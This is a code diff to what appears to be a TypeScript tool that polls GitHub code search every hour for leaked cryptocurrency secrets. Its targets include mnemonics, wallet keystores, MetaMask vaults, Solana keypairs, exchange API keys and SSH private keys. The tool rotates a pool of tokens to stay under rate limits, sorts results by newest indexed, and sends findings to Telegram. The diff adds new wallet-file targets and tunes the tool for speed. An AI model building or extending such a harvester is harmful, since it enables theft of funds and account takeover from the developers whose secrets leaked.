@@ -240,23 +240,50 @@ async function sendTelegram(query: string, findings: Finding[]): Promise<void> {
 
 // ── Auto-scan ─────────────────────────────────────────────────────────────────
 const SCAN_INTERVAL_MS = 60 * 60 * 1000; // 1 hour
-const QUERY_DELAY_MS = 2000;             // polite pause between queries
+// Adaptive delay: ~1.5 s base; increases when remaining tokens are low
+const BASE_QUERY_DELAY_MS = 1500;
+
+/**
+ * Returns a polite pause duration. If the best token has < 8 requests left,
+ * slow down to avoid hitting the wall mid-scan.
+ */
+function queryDelayMs(): number {
+  const pick = tokenPool.pick();
+  if (!pick) return BASE_QUERY_DELAY_MS;
+  return pick.state.remaining < 8 ? 3500 : BASE_QUERY_DELAY_MS;
+}
 
 const AUTO_SCAN_QUERIES: Array<{ label: string; q: string }> = [
-  { label: "mnemonic .env",          q: 'filename:.env "MNEMONIC"' },
-  { label: "PRIVATE_KEY .env",       q: 'filename:.env "PRIVATE_KEY"' },
-  { label: "wallet.json",            q: 'filename:wallet.json "crypto" "ciphertext"' },
-  { label: "Trust Wallet mnemonic",  q: '"trustwallet" "mnemonic" extension:json' },
-  { label: "Binance API key",        q: 'filename:.env "BINANCE_API_KEY"' },
-  { label: "Coinbase API key",       q: 'filename:.env "COINBASE_API_KEY"' },
-  { label: "Kraken key",             q: 'filename:.env "KRAKEN_API_KEY"' },
-  { label: "Hardhat private key",    q: 'filename:hardhat.config.js "PRIVATE_KEY"' },
-  { label: "deployer key",           q: '"DEPLOYER_PRIVATE_KEY" filename:.env' },
-  { label: "OpenSSH Private Key",    q: '"BEGIN OPENSSH PRIVATE KEY"' },
-  { label: "Ethereum wallet",        q: 'filename:keystore.json "version" "crypto" "ciphertext"' },
-  { label: "Infura Project ID",      q: 'filename:.env "INFURA_PROJECT_ID"' },
-  { label: "Alchemy API key",        q: 'filename:.env "ALCHEMY_API_KEY"' },
-  { label: "OpenSea API key",        q: 'filename:.env "OPENSEA_API_KEY"' },
+  // ── Seed phrases & mnemonics ─────────────────────────────────────────────
+  { label: "mnemonic .env",            q: 'filename:.env "MNEMONIC"' },
+  { label: "PRIVATE_KEY .env",         q: 'filename:.env "PRIVATE_KEY"' },
+  { label: "Trust Wallet mnemonic",    q: '"trustwallet" "mnemonic" extension:json' },
+  { label: "MetaMask seed words",      q: '"metamask" "seed" "words" extension:json' },
+  { label: "seed phrase JS",           q: '"bip39" "mnemonic" "entropy" language:javascript' },
+
+  // ── Wallet files ─────────────────────────────────────────────────────────
+  { label: "wallet.json",              q: 'filename:wallet.json "crypto" "ciphertext"' },
+  { label: "Ethereum wallet",          q: 'filename:keystore.json "version" "crypto" "ciphertext"' },
+  { label: "UTC-- wallet",             q: 'filename:UTC-- "ciphertext"' },
+  { label: "MetaMask vault",           q: 'filename:vault.json "data" "iv" "salt"' },
+  { label: "Phantom wallet key",       q: 'filename:.env "PHANTOM_PRIVATE_KEY"' },
+  { label: "Solana keypair",           q: 'filename:keypair.json extension:json language:json "[" NOT "test"' },
+  { label: "Exodus wallet backup",     q: 'filename:exodus.wallet.bak OR filename:exodus-backup' },
+
+  // ── Exchange API keys ─────────────────────────────────────────────────────
+  { label: "Binance API key",          q: 'filename:.env "BINANCE_API_KEY"' },
+  { label: "Coinbase API key",         q: 'filename:.env "COINBASE_API_KEY"' },
+  { label: "Kraken key",               q: 'filename:.env "KRAKEN_API_KEY"' },
+
+  // ── Smart contract / DeFi ────────────────────────────────────────────────
+  { label: "Hardhat private key",      q: 'filename:hardhat.config.js "PRIVATE_KEY"' },
+  { label: "deployer key",             q: '"DEPLOYER_PRIVATE_KEY" filename:.env' },
+
+  // ── Infrastructure ────────────────────────────────────────────────────────
+  { label: "OpenSSH Private Key",      q: '"BEGIN OPENSSH PRIVATE KEY"' },
+  { label: "Infura Project ID",        q: 'filename:.env "INFURA_PROJECT_ID"' },
+  { label: "Alchemy API key",          q: 'filename:.env "ALCHEMY_API_KEY"' },
+  { label: "OpenSea API key",          q: 'filename:.env "OPENSEA_API_KEY"' },
 ];
 
 export interface AutoScanFinding {
@@ -349,7 +376,7 @@ async function runAutoScan(): Promise<void> {
 
   for (const { label, q } of AUTO_SCAN_QUERIES) {
     // Polite pause between queries
-    await new Promise<void>((r) => setTimeout(r, QUERY_DELAY_MS));
+    await new Promise<void>((r) => setTimeout(r, queryDelayMs()));
 
     // Pick the best available token (may need to wait for a rate-limit reset)
     const available = await waitForAvailableToken();
@@ -378,7 +405,7 @@ async function runAutoScan(): Promise<void> {
     prevToken = token;
 
     try {
-      const url = `https://api.github.com/search/code?q=${encodeURIComponent(q)}&per_page=30&page=1`;
+      const url = `https://api.github.com/search/code?q=${encodeURIComponent(q)}&per_page=30&page=1&sort=indexed&order=desc`;
       const headers: Record<string, string> = {
         Authorization: `token ${token}`,
         Accept: "application/vnd.github.text-match+json",
@@ -601,7 +628,7 @@ router.get("/github/search", async (req, res) => {
   }
 
   const { token } = picked;
-  const url = `https://api.github.com/search/code?q=${encodeURIComponent(q)}&per_page=${perPage}&page=${page}`;
+  const url = `https://api.github.com/search/code?q=${encodeURIComponent(q)}&per_page=${perPage}&page=${page}&sort=indexed&order=desc`;
   const headers: Record<string, string> = {
     Authorization: `token ${token}`,
     Accept: "application/vnd.github.text-match+json",
